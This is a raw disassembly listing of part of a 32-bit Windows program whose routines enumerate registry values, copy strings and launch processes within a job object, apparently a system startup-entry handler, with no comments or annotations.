  40308b:	btr    eax,ecx
  40308e:	jmp    0x4030a3
  403090:	mov    edx,DWORD PTR [edi+0x2c]
  403093:	mov    esi,ebx
  403095:	shr    esi,0x5
  403098:	mov    ecx,ebx
  40309a:	and    ecx,0x1f
  40309d:	mov    eax,DWORD PTR [edx+esi*4]
  4030a0:	bts    eax,ecx
  4030a3:	mov    DWORD PTR [edx+esi*4],eax
  4030a6:	inc    ebx
  4030a7:	movzx  eax,WORD PTR [edi+0x2a]
  4030ab:	cmp    ebx,eax
  4030ad:	jb     0x40303a
  4030af:	jmp    0x4030ea
  4030b1:	movzx  eax,WORD PTR [edi+0x2a]
  4030b5:	mov    DWORD PTR [edi+0x24],ebx
  4030b8:	mov    BYTE PTR [edi+0x28],bl
  4030bb:	mov    DWORD PTR [edi+0x10],ebx
  4030be:	mov    DWORD PTR [edi+0x14],ebx
  4030c1:	mov    DWORD PTR [edi+0x18],ebx
  4030c4:	mov    DWORD PTR [edi+0x1c],ebx
  4030c7:	test   ax,ax
  4030ca:	je     0x4030ea
  4030cc:	dec    eax
  4030cd:	cdq    
  4030ce:	and    edx,0x1f
  4030d1:	add    eax,edx
  4030d3:	sar    eax,0x5
  4030d6:	lea    eax,[eax*4+0x4]
  4030dd:	push   eax
  4030de:	push   ebx
  4030df:	push   DWORD PTR [edi+0x2c]
  4030e2:	call   0x406aee
  4030e7:	add    esp,0xc
  4030ea:	pop    edi
  4030eb:	pop    esi
  4030ec:	pop    ebx
  4030ed:	pop    ebp
  4030ee:	ret    0x24
  4030f1:	int3   
  4030f2:	int3   
  4030f3:	int3   
  4030f4:	int3   
  4030f5:	int3   
  4030f6:	mov    eax,ds:0x4074d0
  4030fb:	or     eax,DWORD PTR ds:0x4074d4
  403101:	je     0x403107
  403103:	xor    eax,eax
  403105:	jmp    0x403121
  403107:	push   0x4074d0
  40310c:	push   0x407010
  403111:	push   0x402fe0
  403116:	push   0x401178
  40311b:	call   DWORD PTR ds:0x40801c
  403121:	ret    0x8
  403124:	int3   
  403125:	int3   
  403126:	int3   
  403127:	int3   
  403128:	int3   
  403129:	push   0x0
  40312b:	push   0x0
  40312d:	push   ecx
  40312e:	push   DWORD PTR ds:0x4074d4
  403134:	push   DWORD PTR ds:0x4074d0
  40313a:	call   DWORD PTR ds:0x408018
  403140:	ret    0x8
  403143:	int3   
  403144:	int3   
  403145:	int3   
  403146:	int3   
  403147:	int3   
  403148:	mov    edi,edi
  40314a:	push   ebp
  40314b:	mov    ebp,esp
  40314d:	sub    esp,0x4ec
  403153:	mov    eax,ds:0x407004
  403158:	xor    eax,ebp
  40315a:	mov    DWORD PTR [ebp-0x4],eax
  40315d:	mov    eax,DWORD PTR [ebp+0x10]
  403160:	mov    DWORD PTR [ebp-0x4d8],eax
  403166:	mov    eax,DWORD PTR [ebp+0x8]
  403169:	and    eax,0x1
  40316c:	mov    DWORD PTR [ebp-0x4bc],ecx
  403172:	push   ebx
  403173:	mov    DWORD PTR [ebp-0x4cc],eax
  403179:	neg    eax
  40317b:	push   esi
  40317c:	push   edi
  40317d:	mov    edi,DWORD PTR [ebp+0xc]
  403180:	mov    esi,edx
  403182:	sbb    eax,eax
  403184:	mov    DWORD PTR [ebp-0x4c0],esi
  40318a:	lea    edx,[ebp-0x4c8]
  403190:	mov    DWORD PTR [ebp-0x4e0],edi
  403196:	push   edx
  403197:	and    eax,0x10006
  40319c:	add    eax,0x20019
  4031a1:	push   eax
  4031a2:	push   0x0
  4031a4:	push   esi
  4031a5:	push   ecx
  4031a6:	call   DWORD PTR ds:0x408000
  4031ac:	test   eax,eax
  4031ae:	jne    0x4035a4
  4031b4:	lea    eax,[ebp-0x4d0]
  4031ba:	xor    ebx,ebx
  4031bc:	push   eax
  4031bd:	mov    eax,0x40164c
  4031c2:	push   eax
  4031c3:	push   eax
  4031c4:	push   edi
  4031c5:	call   DWORD PTR ds:0x4080f8
  4031cb:	test   DWORD PTR ds:0x407500,0x4000
  4031d5:	je     0x4031e5
  4031d7:	push   ecx
  4031d8:	push   ecx
  4031d9:	mov    edx,esi
  4031db:	mov    ecx,0x401108
  4031e0:	call   0x403631
  4031e5:	xor    eax,eax
  4031e7:	lea    ecx,[ebp-0x4dc]
  4031ed:	mov    DWORD PTR [ebp-0x4c4],eax
  4031f3:	push   ecx
  4031f4:	lea    ecx,[ebp-0x4b8]
  4031fa:	mov    DWORD PTR [ebp-0x4e4],0x50
  403204:	push   ecx
  403205:	lea    ecx,[ebp-0x4d4]
  40320b:	mov    DWORD PTR [ebp-0x4dc],0x208
  403215:	push   ecx
  403216:	push   0x0
  403218:	lea    ecx,[ebp-0x4e4]
  40321e:	push   ecx
  40321f:	lea    ecx,[ebp-0xa8]
  403225:	push   ecx
  403226:	push   eax
  403227:	push   DWORD PTR [ebp-0x4c8]
  40322d:	call   DWORD PTR ds:0x40800c
  403233:	mov    edi,eax
  403235:	cmp    edi,0xea
  40323b:	je     0x403372
  403241:	test   edi,edi
  403243:	jne    0x40337e
  403249:	mov    eax,DWORD PTR [ebp-0x4d4]
  40324f:	cmp    eax,0x1
  403252:	je     0x40325d
  403254:	cmp    eax,0x2
  403257:	jne    0x403372
  40325d:	mov    ecx,DWORD PTR [ebp-0x4d0]
  403263:	test   ecx,ecx
  403265:	je     0x40328c
  403267:	mov    eax,DWORD PTR [ecx]
  403269:	lea    edx,[ebp-0xa8]
  40326f:	push   edx
  403270:	push   ecx
  403271:	mov    esi,DWORD PTR [eax+0x10]
  403274:	mov    ecx,esi
  403276:	call   DWORD PTR ds:0x4082f0
  40327c:	call   esi
  40327e:	test   eax,eax
  403280:	je     0x403372
  403286:	mov    eax,DWORD PTR [ebp-0x4d4]
  40328c:	mov    edi,0x104
  403291:	cmp    eax,0x2
  403294:	jne    0x4032d7
  403296:	lea    eax,[ebp-0x4b8]
  40329c:	mov    edx,edi
  40329e:	push   eax
  40329f:	lea    ecx,[ebp-0x2b0]
  4032a5:	call   0x4035c0
  4032aa:	test   eax,eax
  4032ac:	js     0x403372
  4032b2:	push   edi
  4032b3:	lea    eax,[ebp-0x4b8]
  4032b9:	push   eax
  4032ba:	lea    eax,[ebp-0x2b0]
  4032c0:	push   eax
  4032c1:	call   DWORD PTR ds:0x4080f4
  4032c7:	test   eax,eax
  4032c9:	je     0x403372
  4032cf:	cmp    eax,edi
  4032d1:	ja     0x403372
  4032d7:	push   0x43
  4032d9:	call   DWORD PTR ds:0x408150
  4032df:	test   eax,eax
  4032e1:	je     0x4032f1
  4032e3:	cmp    WORD PTR [ebp-0xa8],0x2a
  4032eb:	jne    0x403372
  4032f1:	push   0x618
  4032f6:	push   0x40
  4032f8:	call   DWORD PTR ds:0x40806c
  4032fe:	mov    esi,eax
  403300:	test   esi,esi
  403302:	je     0x403372
  403304:	push   DWORD PTR [ebp-0x4c0]
  40330a:	mov    edx,edi
  40330c:	mov    ecx,esi
  40330e:	call   0x4035c0
  403313:	test   eax,eax
  403315:	js     0x403372
  403317:	lea    eax,[ebp-0xa8]
  40331d:	mov    edx,edi
  40331f:	push   eax
  403320:	lea    ecx,[esi+0x208]
  403326:	call   0x4035c0
  40332b:	test   eax,eax
  40332d:	js     0x403372
  40332f:	lea    eax,[ebp-0x4b8]
  403335:	mov    edx,edi
  403337:	push   eax
  403338:	lea    ecx,[esi+0x410]
  40333e:	call   0x4035c0
  403343:	test   eax,eax
  403345:	js     0x403372
  403347:	test   ebx,ebx
  403349:	jne    0x403359
  40334b:	push   0x5
  40334d:	call   DWORD PTR ds:0x408034
  403353:	mov    ebx,eax
  403355:	test   ebx,ebx
  403357:	je     0x40336b
  403359:	push   esi
  40335a:	push   0x7fffffff
  40335f:	push   ebx
  403360:	call   DWORD PTR ds:0x40802c
  403366:	cmp    eax,0xffffffff
  403369:	jne    0x403372
  40336b:	push   esi
  40336c:	call   DWORD PTR ds:0x408070
  403372:	mov    eax,DWORD PTR [ebp-0x4c4]
  403378:	inc    eax
  403379:	jmp    0x4031e7
  40337e:	sub    edi,0x103
  403384:	neg    edi
  403386:	sbb    edi,edi
  403388:	not    edi
  40338a:	and    edi,0x1
  40338d:	mov    DWORD PTR [ebp-0x4e8],edi
  403393:	test   ebx,ebx
  403395:	je     0x40355c
  40339b:	xor    eax,eax
  40339d:	push   0x1fe
  4033a2:	push   eax
  4033a3:	mov    WORD PTR [ebp-0x2a8],ax
  4033aa:	lea    eax,[ebp-0x2a6]
  4033b0:	push   eax
  4033b1:	call   0x406aee
  4033b6:	mov    esi,DWORD PTR [ebp-0x4c0]
  4033bc:	add    esp,0xc
  4033bf:	cmp    DWORD PTR [ebp-0x4bc],0x80000002
  4033c9:	jne    0x403416
  4033cb:	push   0x1
  4033cd:	push   0xffffffff
  4033cf:	push   esi
  4033d0:	push   0xffffffff
  4033d2:	push   0x401460
  4033d7:	call   DWORD PTR ds:0x408224
  4033dd:	cmp    eax,0x2
  4033e0:	jne    0x403416
  4033e2:	lea    eax,[ebp-0x4bc]
  4033e8:	mov    DWORD PTR [ebp-0x4bc],0x200
  4033f2:	push   eax
  4033f3:	lea    eax,[ebp-0x2a8]
  4033f9:	push   eax
  4033fa:	push   0x0
  4033fc:	push   0x20000002
  403401:	push   0x401580
  403406:	push   0x4015b0
  40340b:	push   0x80000002
  403410:	call   DWORD PTR ds:0x408210
  403416:	mov    eax,DWORD PTR [ebx]
  403418:	xor    ecx,ecx
  40341a:	mov    DWORD PTR [ebp-0x4bc],eax
  403420:	mov    DWORD PTR [ebp-0x4c4],ecx
  403426:	test   eax,eax
  403428:	jle    0x403553
  40342e:	push   0x21
  403430:	pop    edx
  403431:	mov    edi,eax
  403433:	cmp    DWORD PTR [ebp-0x4cc],0x0
  40343a:	mov    eax,DWORD PTR [ebx+0x4]
  40343d:	mov    esi,DWORD PTR [eax+ecx*4]
  403440:	je     0x403462
  403442:	lea    eax,[esi+0x208]
  403448:	cmp    WORD PTR [eax],dx
  40344b:	je     0x403462
  40344d:	push   eax
  40344e:	push   DWORD PTR [ebp-0x4c8]
  403454:	call   DWORD PTR ds:0x408004
  40345a:	test   eax,eax
  40345c:	jne    0x403528
  403462:	cmp    WORD PTR [ebp-0x2a8],0x0
  40346a:	je     0x4034d7
  40346c:	push   0x1
  40346e:	push   0xffffffff
  403470:	lea    eax,[ebp-0x2a8]
  403476:	push   eax
  403477:	push   0xffffffff
  403479:	lea    eax,[esi+0x208]
  40347f:	push   eax
  403480:	call   DWORD PTR ds:0x408224
  403486:	cmp    eax,0x2
  403489:	jne    0x4034d7
  40348b:	push   0x401610
  403490:	push   0x1
  403492:	push   0x1
  403494:	push   0x0
  403496:	call   DWORD PTR ds:0x408240
  40349c:	mov    DWORD PTR [ebp-0x4bc],eax
  4034a2:	test   eax,eax
  4034a4:	je     0x4034b9
  4034a6:	push   eax
  4034a7:	call   DWORD PTR ds:0x408238
  4034ad:	push   DWORD PTR [ebp-0x4bc]
  4034b3:	call   DWORD PTR ds:0x40807c
  4034b9:	push   0x401580
  4034be:	push   0x4015b0
  4034c3:	push   0x80000002
  4034c8:	call   DWORD PTR ds:0x4080f0
  4034ce:	xor    eax,eax
  4034d0:	mov    WORD PTR [ebp-0x2a8],ax
  4034d7:	push   DWORD PTR [ebp+0x14]
  4034da:	lea    eax,[esi+0x410]
  4034e0:	push   DWORD PTR [ebp-0x4e0]
  4034e6:	lea    ecx,[esi+0x208]
  4034ec:	push   DWORD PTR [ebp+0x8]
  4034ef:	push   eax
  4034f0:	push   ecx
  4034f1:	mov    ecx,DWORD PTR [ebp-0x4d8]
  4034f7:	push   esi
  4034f8:	call   DWORD PTR ds:0x4082f0
  4034fe:	call   DWORD PTR [ebp-0x4d8]
  403504:	cmp    DWORD PTR [ebp-0x4cc],0x0
  40350b:	je     0x403528
  40350d:	push   0x21
  40350f:	lea    eax,[esi+0x208]
  403515:	pop    ecx
  403516:	cmp    WORD PTR [eax],cx
  403519:	jne    0x403528
  40351b:	push   eax
  40351c:	push   DWORD PTR [ebp-0x4c8]
  403522:	call   DWORD PTR ds:0x408004
  403528:	push   esi
  403529:	call   DWORD PTR ds:0x408070
  40352f:	mov    ecx,DWORD PTR [ebp-0x4c4]
  403535:	inc    ecx
  403536:	mov    DWORD PTR [ebp-0x4c4],ecx
  40353c:	push   0x21
  40353e:	pop    edx
  40353f:	cmp    ecx,edi
  403541:	jl     0x403433
  403547:	mov    edi,DWORD PTR [ebp-0x4e8]
  40354d:	mov    esi,DWORD PTR [ebp-0x4c0]
  403553:	push   ebx
  403554:	call   DWORD PTR ds:0x408030
  40355a:	jmp    0x403562
  40355c:	mov    esi,DWORD PTR [ebp-0x4c0]
  403562:	test   DWORD PTR ds:0x407500,0x4000
  40356c:	je     0x40357c
  40356e:	push   ecx
  40356f:	push   ecx
  403570:	mov    edx,esi
  403572:	mov    ecx,0x401118
  403577:	call   0x403631
  40357c:	push   DWORD PTR [ebp-0x4c8]
  403582:	call   DWORD PTR ds:0x408008
  403588:	mov    ecx,DWORD PTR [ebp-0x4d0]
  40358e:	test   ecx,ecx
  403590:	je     0x4035a6
  403592:	mov    eax,DWORD PTR [ecx]
  403594:	push   ecx
  403595:	mov    esi,DWORD PTR [eax+0x8]
  403598:	mov    ecx,esi
  40359a:	call   DWORD PTR ds:0x4082f0
  4035a0:	call   esi
  4035a2:	jmp    0x4035a6
  4035a4:	xor    edi,edi
  4035a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4035a9:	mov    eax,edi
  4035ab:	pop    edi
  4035ac:	pop    esi
  4035ad:	xor    ecx,ebp
  4035af:	pop    ebx
  4035b0:	call   0x4063a0
  4035b5:	mov    esp,ebp
  4035b7:	pop    ebp
  4035b8:	ret    0x10
  4035bb:	int3   
  4035bc:	int3   
  4035bd:	int3   
  4035be:	int3   
  4035bf:	int3   
  4035c0:	mov    edi,edi
  4035c2:	push   ebp
  4035c3:	mov    ebp,esp
  4035c5:	push   esi
  4035c6:	xor    esi,esi
  4035c8:	test   edx,edx
  4035ca:	je     0x4035d4
  4035cc:	cmp    edx,0x7fffffff
  4035d2:	jbe    0x4035d9
  4035d4:	mov    esi,0x80070057
  4035d9:	test   esi,esi
  4035db:	js     0x40361c
  4035dd:	xor    esi,esi
  4035df:	test   edx,edx
  4035e1:	je     0x403612
  4035e3:	push   ebx
  4035e4:	mov    ebx,DWORD PTR [ebp+0x8]
  4035e7:	push   edi
  4035e8:	mov    edi,0x7ffffffe
  4035ed:	sub    edi,edx
  4035ef:	sub    ebx,ecx
  4035f1:	lea    eax,[edi+edx*1]
  4035f4:	test   eax,eax
  4035f6:	je     0x40360c
  4035f8:	movzx  eax,WORD PTR [ebx+ecx*1]
  4035fc:	test   ax,ax
  4035ff:	je     0x40360c
  403601:	mov    WORD PTR [ecx],ax
  403604:	add    ecx,0x2
  403607:	sub    edx,0x1
  40360a:	jne    0x4035f1
  40360c:	pop    edi
  40360d:	pop    ebx
  40360e:	test   edx,edx
  403610:	jne    0x403620
  403612:	sub    ecx,0x2
  403615:	mov    esi,0x8007007a
  40361a:	jmp    0x403620
  40361c:	test   edx,edx
  40361e:	je     0x403625
  403620:	xor    eax,eax
  403622:	mov    WORD PTR [ecx],ax
  403625:	mov    eax,esi
  403627:	pop    esi
  403628:	pop    ebp
  403629:	ret    0x4
  40362c:	int3   
  40362d:	int3   
  40362e:	int3   
  40362f:	int3   
  403630:	int3   
  403631:	mov    edi,edi
  403633:	push   ebp
  403634:	mov    ebp,esp
  403636:	sub    esp,0x1c
  403639:	mov    eax,ds:0x407004
  40363e:	xor    eax,ebp
  403640:	mov    DWORD PTR [ebp-0x4],eax
  403643:	push   ebx
  403644:	push   esi
  403645:	xor    ebx,ebx
  403647:	push   edi
  403648:	mov    edi,ecx
  40364a:	test   edx,edx
  40364c:	je     0x40366b
  40364e:	mov    ecx,edx
  403650:	lea    esi,[ecx+0x2]
  403653:	mov    ax,WORD PTR [ecx]
  403656:	add    ecx,0x2
  403659:	cmp    ax,bx
  40365c:	jne    0x403653
  40365e:	sub    ecx,esi
  403660:	sar    ecx,1
  403662:	lea    ecx,[ecx*2+0x2]
  403669:	jmp    0x40366e
  40366b:	push   0xa
  40366d:	pop    ecx
  40366e:	test   edx,edx
  403670:	jne    0x403677
  403672:	mov    edx,0x401640
  403677:	lea    eax,[ebp-0x18]
  40367a:	mov    DWORD PTR [ebp-0x18],edx
  40367d:	push   eax
  40367e:	push   0x1
  403680:	push   edi
  403681:	push   DWORD PTR ds:0x4074d4
  403687:	mov    DWORD PTR [ebp-0x14],ebx
  40368a:	push   DWORD PTR ds:0x4074d0
  403690:	mov    DWORD PTR [ebp-0x10],ecx
  403693:	mov    DWORD PTR [ebp-0xc],ebx
  403696:	call   DWORD PTR ds:0x408018
  40369c:	mov    ecx,DWORD PTR [ebp-0x4]
  40369f:	pop    edi
  4036a0:	pop    esi
  4036a1:	xor    ecx,ebp
  4036a3:	pop    ebx
  4036a4:	call   0x4063a0
  4036a9:	mov    esp,ebp
  4036ab:	pop    ebp
  4036ac:	ret    0x8
  4036af:	int3   
  4036b0:	int3   
  4036b1:	int3   
  4036b2:	int3   
  4036b3:	int3   
  4036b4:	mov    edi,edi
  4036b6:	push   esi
  4036b7:	mov    esi,ecx
  4036b9:	push   0x5c
  4036bb:	push   esi
  4036bc:	call   DWORD PTR ds:0x408280
  4036c2:	pop    ecx
  4036c3:	pop    ecx
  4036c4:	test   eax,eax
  4036c6:	je     0x4036cb
  4036c8:	lea    esi,[eax+0x2]
  4036cb:	mov    eax,esi
  4036cd:	pop    esi
  4036ce:	ret    
  4036cf:	int3   
  4036d0:	int3   
  4036d1:	int3   
  4036d2:	int3   
  4036d3:	int3   
  4036d4:	mov    edi,edi
  4036d6:	push   ebp
  4036d7:	mov    ebp,esp
  4036d9:	push   ecx
  4036da:	mov    eax,ds:0x407004
  4036df:	xor    eax,ebp
  4036e1:	mov    DWORD PTR [ebp-0x4],eax
  4036e4:	push   ebx
  4036e5:	push   esi
  4036e6:	mov    esi,DWORD PTR ds:0x407144
  4036ec:	mov    ebx,ecx
  4036ee:	push   edi
  4036ef:	mov    edi,edx
  4036f1:	cmp    esi,0xffffffff
  4036f4:	jne    0x403724
  4036f6:	push   0x800
  4036fb:	push   0x0
  4036fd:	push   0x40165c
  403702:	call   DWORD PTR ds:0x4081cc
  403708:	test   eax,eax
  40370a:	je     0x40371c
  40370c:	push   0x401678
  403711:	push   eax
  403712:	call   DWORD PTR ds:0x40808c
  403718:	mov    esi,eax
  40371a:	jmp    0x40371e
  40371c:	xor    esi,esi
  40371e:	mov    DWORD PTR ds:0x407144,esi
  403724:	test   esi,esi
  403726:	je     0x403738
  403728:	push   0x1
  40372a:	push   edi
  40372b:	push   ebx
  40372c:	mov    ecx,esi
  40372e:	call   DWORD PTR ds:0x4082f0
  403734:	call   esi
  403736:	jmp    0x40373d
  403738:	and    DWORD PTR [edi],0x0
  40373b:	xor    eax,eax
  40373d:	mov    ecx,DWORD PTR [ebp-0x4]
  403740:	pop    edi
  403741:	pop    esi
  403742:	xor    ecx,ebp
  403744:	pop    ebx
  403745:	call   0x4063a0
  40374a:	mov    esp,ebp
  40374c:	pop    ebp
  40374d:	ret    0x4
  403750:	int3   
  403751:	int3   
  403752:	int3   
  403753:	int3   
  403754:	int3   
  403755:	mov    edi,edi
  403757:	push   ebp
  403758:	mov    ebp,esp
  40375a:	push   ecx
  40375b:	push   ecx
  40375c:	push   ebx
  40375d:	push   esi
  40375e:	push   edi
  40375f:	mov    esi,edx
  403761:	mov    ebx,ecx
  403763:	xor    edi,edi
  403765:	call   0x4040d2
  40376a:	test   eax,eax
  40376c:	je     0x4037b2
  40376e:	push   0x1
  403770:	call   DWORD PTR ds:0x4080a4
  403776:	test   eax,eax
  403778:	je     0x4037b2
  40377a:	or     DWORD PTR [esi],0x2
  40377d:	lea    eax,[ebp-0x4]
  403780:	push   0x0
  403782:	push   0x0
  403784:	push   eax
  403785:	push   ebx
  403786:	inc    edi
  403787:	call   DWORD PTR ds:0x4080ac
  40378d:	test   eax,eax
  40378f:	js     0x4037b2
  403791:	push   ecx
  403792:	mov    ecx,DWORD PTR [ebp-0x4]
  403795:	lea    edx,[ebp-0x8]
  403798:	call   0x4036d4
  40379d:	test   DWORD PTR [ebp-0x8],0x8000
  4037a4:	je     0x4037a9
  4037a6:	or     DWORD PTR [esi],0x20
  4037a9:	push   DWORD PTR [ebp-0x4]
  4037ac:	call   DWORD PTR ds:0x40818c
  4037b2:	mov    eax,edi
  4037b4:	pop    edi
  4037b5:	pop    esi
  4037b6:	pop    ebx
  4037b7:	mov    esp,ebp
  4037b9:	pop    ebp
  4037ba:	ret    
  4037bb:	int3   
  4037bc:	int3   
  4037bd:	int3   
  4037be:	int3   
  4037bf:	int3   
  4037c0:	mov    edi,edi
  4037c2:	push   ebp
  4037c3:	mov    ebp,esp
  4037c5:	and    esp,0xfffffff8
  4037c8:	sub    esp,0xc
  4037cb:	push   ebx
  4037cc:	mov    ebx,DWORD PTR [ebp+0x14]
  4037cf:	push   esi
  4037d0:	push   edi
  4037d1:	push   0x401460
  4037d6:	push   DWORD PTR [ebp+0x8]
  4037d9:	xor    edi,edi
  4037db:	mov    DWORD PTR [esp+0x18],ebx
  4037df:	mov    DWORD PTR [esp+0x1c],edi
  4037e3:	call   DWORD PTR ds:0x408100
  4037e9:	mov    esi,DWORD PTR [ebp+0x10]
  4037ec:	test   eax,eax
  4037ee:	jne    0x403803
  4037f0:	lea    edx,[esp+0x10]
  4037f4:	mov    ecx,esi
  4037f6:	call   0x403755
  4037fb:	mov    ebx,DWORD PTR [esp+0x10]
  4037ff:	mov    DWORD PTR [esp+0x14],eax
  403803:	test   esi,esi
  403805:	je     0x403833
  403807:	cmp    WORD PTR [esi],di
  40380a:	je     0x403833
  40380c:	test   bl,0x20
  40380f:	je     0x403823
  403811:	push   DWORD PTR [ebp+0x18]
  403814:	mov    edx,ebx
  403816:	mov    ecx,esi
  403818:	call   0x40389c
  40381d:	mov    edi,eax
  40381f:	test   edi,edi
  403821:	jns    0x403838
  403823:	push   DWORD PTR [ebp+0x18]
  403826:	mov    edx,ebx
  403828:	mov    ecx,esi
  40382a:	call   0x403bb4
  40382f:	mov    edi,eax
  403831:	jmp    0x403838
  403833:	mov    edi,0x80004005
  403838:	cmp    DWORD PTR [esp+0x14],0x0
  40383d:	je     0x403847
  40383f:	push   0x0
  403841:	call   DWORD PTR ds:0x4080a4
  403847:	mov    eax,edi
  403849:	pop    edi
  40384a:	pop    esi
  40384b:	pop    ebx
  40384c:	mov    esp,ebp
  40384e:	pop    ebp
  40384f:	ret    0x18
  403852:	int3   
  403853:	int3   
  403854:	int3   
  403855:	int3   
  403856:	int3   
  403857:	int3   
  403858:	int3   
  403859:	int3   
  40385a:	int3   
  40385b:	int3   
  40385c:	int3   
  40385d:	int3   
  40385e:	int3   
  40385f:	int3   
  403860:	mov    edi,edi
  403862:	push   ebp
  403863:	mov    ebp,esp
  403865:	sub    esp,0xc
  403868:	cmp    DWORD PTR [ebp+0x8],0x0
  40386c:	jmp    0x403872
  40386e:	cmp    DWORD PTR [ebp-0x4],0x4
  403872:	je     0x40388f
  403874:	push   0xffffffff
  403876:	lea    eax,[ebp-0x8]
  403879:	push   eax
  40387a:	lea    eax,[ebp-0xc]
  40387d:	push   eax
  40387e:	lea    eax,[ebp-0x4]
  403881:	push   eax
  403882:	push   DWORD PTR [ebp+0x8]
  403885:	call   DWORD PTR ds:0x4081b0
  40388b:	test   eax,eax
  40388d:	jne    0x40386e
  40388f:	xor    eax,eax
  403891:	mov    esp,ebp
  403893:	pop    ebp
  403894:	ret    0x4
  403897:	int3   
  403898:	int3   
  403899:	int3   
  40389a:	int3   
  40389b:	int3   
  40389c:	mov    edi,edi
  40389e:	push   ebp
  40389f:	mov    ebp,esp
  4038a1:	sub    esp,0x6a0
  4038a7:	mov    eax,ds:0x407004
  4038ac:	xor    eax,ebp
  4038ae:	mov    DWORD PTR [ebp-0x8],eax
  4038b1:	mov    eax,DWORD PTR [ebp+0x8]
  4038b4:	push   ebx
  4038b5:	push   esi
  4038b6:	push   edi
  4038b7:	xor    ebx,ebx
  4038b9:	mov    DWORD PTR [ebp-0x62c],edx
  4038bf:	push   ebx
  4038c0:	push   ebx
  4038c1:	mov    DWORD PTR [ebp-0x628],ecx
  4038c7:	mov    DWORD PTR [ebp-0x648],eax
  4038cd:	call   DWORD PTR ds:0x40809c
  4038d3:	mov    edi,eax
  4038d5:	mov    DWORD PTR [ebp-0x634],edi
  4038db:	test   edi,edi
  4038dd:	je     0x4038e3
  4038df:	mov    esi,ebx
  4038e1:	jmp    0x4038f2
  4038e3:	call   0x4040b1
  4038e8:	mov    esi,eax
  4038ea:	test   esi,esi
  4038ec:	js     0x403b9a
  4038f2:	push   0x1
  4038f4:	push   ebx
  4038f5:	push   ebx
  4038f6:	push   0xffffffff
  4038f8:	call   DWORD PTR ds:0x4081b4
  4038fe:	mov    ebx,eax
  403900:	test   ebx,ebx
  403902:	je     0x403b93
  403908:	push   0x8
  40390a:	lea    eax,[ebp-0x650]
  403910:	mov    DWORD PTR [ebp-0x650],edi
  403916:	push   eax
  403917:	push   0x7
  403919:	push   edi
  40391a:	mov    DWORD PTR [ebp-0x64c],ebx
  403920:	call   DWORD PTR ds:0x4080a0
  403926:	test   eax,eax
  403928:	jne    0x403933
  40392a:	push   ebx
  40392b:	call   DWORD PTR ds:0x40807c
  403931:	xor    ebx,ebx
  403933:	test   ebx,ebx
  403935:	je     0x403b93
  40393b:	lea    eax,[ebp-0x64c]
  403941:	push   eax
  403942:	push   0x4
  403944:	push   ebx
  403945:	push   0x403860
  40394a:	push   0x0
  40394c:	push   0x0
  40394e:	call   DWORD PTR ds:0x408084
  403954:	mov    edi,eax
  403956:	mov    DWORD PTR [ebp-0x630],edi
  40395c:	test   edi,edi
  40395e:	jne    0x40396f
  403960:	call   0x4040b1
  403965:	mov    esi,eax
  403967:	test   esi,esi
  403969:	js     0x403b86
  40396f:	push   0x104
  403974:	lea    eax,[ebp-0x214]
  40397a:	push   eax
  40397b:	call   DWORD PTR ds:0x40824c
  403981:	test   DWORD PTR ds:0x407500,0x2000
  40398b:	mov    DWORD PTR [ebp-0x654],eax
  403991:	je     0x4039ab
  403993:	mov    edx,DWORD PTR [ebp-0x628]
  403999:	push   ecx
  40399a:	push   ecx
  40399b:	mov    ecx,0x401148
  4039a0:	call   0x403631
  4039a5:	mov    eax,DWORD PTR [ebp-0x654]
  4039ab:	mov    esi,0x80004005
  4039b0:	test   eax,eax
  4039b2:	je     0x403b56
  4039b8:	mov    ecx,0x104
  4039bd:	cmp    eax,ecx
  4039bf:	jae    0x403b56
  4039c5:	push   0x401690
  4039ca:	push   ecx
  4039cb:	lea    eax,[ebp-0x214]
  4039d1:	push   eax
  4039d2:	call   DWORD PTR ds:0x4081d4
  4039d8:	test   eax,eax
  4039da:	js     0x403b56
  4039e0:	push   DWORD PTR [ebp-0x628]
  4039e6:	lea    eax,[ebp-0x624]
  4039ec:	push   0x400
  4039f1:	push   0x4016b0
  4039f6:	push   0x208
  4039fb:	push   eax
  4039fc:	call   0x404045
  403a01:	add    esp,0x14
  403a04:	test   eax,eax
  403a06:	js     0x403b56
  403a0c:	push   0x40
  403a0e:	xor    esi,esi
  403a10:	mov    DWORD PTR [ebp-0x69c],0x44
  403a1a:	lea    eax,[ebp-0x698]
  403a20:	push   esi
  403a21:	push   eax
  403a22:	call   0x406aee
  403a27:	xor    eax,eax
  403a29:	lea    edi,[ebp-0x644]
  403a2f:	stos   DWORD PTR es:[edi],eax
  403a30:	add    esp,0xc
  403a33:	stos   DWORD PTR es:[edi],eax
  403a34:	stos   DWORD PTR es:[edi],eax
  403a35:	stos   DWORD PTR es:[edi],eax
  403a36:	lea    eax,[ebp-0x644]
  403a3c:	push   eax
  403a3d:	lea    eax,[ebp-0x69c]
  403a43:	push   eax
  403a44:	push   esi
  403a45:	push   esi
  403a46:	push   0x4
  403a48:	push   esi
  403a49:	push   esi
  403a4a:	push   esi
  403a4b:	lea    eax,[ebp-0x624]
  403a51:	push   eax
  403a52:	lea    eax,[ebp-0x214]
  403a58:	push   eax
  403a59:	call   DWORD PTR ds:0x408074
  403a5f:	test   eax,eax
  403a61:	jne    0x403a74
  403a63:	call   0x4040b1
  403a68:	mov    esi,eax
  403a6a:	test   esi,esi
  403a6c:	js     0x403b50
  403a72:	xor    esi,esi
  403a74:	push   DWORD PTR [ebp-0x644]
  403a7a:	push   DWORD PTR [ebp-0x634]
  403a80:	call   DWORD PTR ds:0x408098
  403a86:	test   eax,eax
  403a88:	jne    0x403a99
  403a8a:	call   0x4040b1
  403a8f:	mov    esi,eax
  403a91:	test   esi,esi
  403a93:	js     0x403b1e
  403a99:	push   DWORD PTR [ebp-0x640]
  403a9f:	call   DWORD PTR ds:0x408200
  403aa5:	mov    edi,DWORD PTR [ebp-0x630]
  403aab:	push   edi
  403aac:	call   DWORD PTR ds:0x408200
  403ab2:	mov    eax,DWORD PTR [ebp-0x62c]
  403ab8:	test   al,0x2
  403aba:	je     0x403adb
  403abc:	push   ecx
  403abd:	xor    eax,eax
  403abf:	mov    DWORD PTR [ebp-0x62c],edi
  403ac5:	push   ecx
  403ac6:	test   edi,edi
  403ac8:	lea    edx,[ebp-0x62c]
  403ace:	push   0xffffffff
  403ad0:	setne  al
  403ad3:	push   eax
  403ad4:	call   0x403e9e
  403ad9:	jmp    0x403af0
  403adb:	test   al,0x40
  403add:	je     0x403af0
  403adf:	mov    edx,DWORD PTR [ebp-0x644]
  403ae5:	mov    ecx,DWORD PTR [ebp-0x648]
  403aeb:	call   0x403d50
  403af0:	test   DWORD PTR ds:0x407500,0x2000
  403afa:	je     0x403b32
